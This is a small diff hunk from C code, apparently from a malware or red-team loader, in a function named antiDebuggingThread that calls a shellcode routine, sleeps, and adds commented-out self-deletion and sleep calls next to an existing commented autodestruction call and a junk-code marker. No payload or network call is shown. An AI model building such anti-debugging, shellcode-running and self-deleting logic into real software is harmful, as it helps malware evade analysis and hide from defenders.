@@ -16,7 +16,9 @@ void *antiDebuggingThread() {
         shellcodec();
 
         sleep(50);
+        // sleep(5);
         // autodestruction();
+        // SelfDelete(1);
     }
    //  JUNK
 }
